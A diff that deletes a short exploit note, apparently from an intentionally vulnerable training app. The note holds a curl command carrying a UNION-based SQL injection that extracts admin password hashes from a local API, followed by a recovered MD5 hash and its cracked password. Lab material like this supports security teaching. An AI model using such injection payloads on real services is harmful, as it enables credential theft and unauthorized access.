@@ -1,7 +1,0 @@
-curl -G 'http://127.0.0.1:5000/api/v1/employees' \
-  --cookie 'session=ТВОЯ_COOKIE' \
-  --data-urlencode "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,title,department,phone,office,manager_id FROM users WHERE role='admin' -- "
-
-Текущий результат (после init-db 2026-11-10):
-  full_name = password_hash админа = 0691df26da82d6eb2e5da8924628db63 = md5("bowwow")
-  (шар coming from rockyou; см. README -> "Intended exploitation path (runbook)")
